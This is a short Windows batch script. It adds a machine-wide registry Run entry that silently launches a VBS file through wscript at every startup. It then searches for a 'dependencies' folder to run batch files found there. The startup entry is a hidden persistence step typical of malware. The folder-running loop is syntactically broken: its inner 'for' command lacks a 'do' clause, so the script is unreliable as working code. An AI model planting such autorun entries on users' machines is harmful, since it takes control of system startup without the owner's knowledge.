@echo off
set "VBSPath=%~dp0runner silent.vbs"
set "targetFolder=dependencies"

:: 1. Force Registry to trigger via wscript (Classic engine)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "ClassicStartup" /t REG_SZ /d "wscript.exe \"%VBSPath%\"" /f

:: 2. Find and run .bat files in the dependencies folder
for /d /r "%~dp0" %%D in (*) do (
    if /i "%%~nxD"=="%targetFolder%" (
        for %%F in ("%%D\*.bat")
        goto :End
    )
)

:End
exit
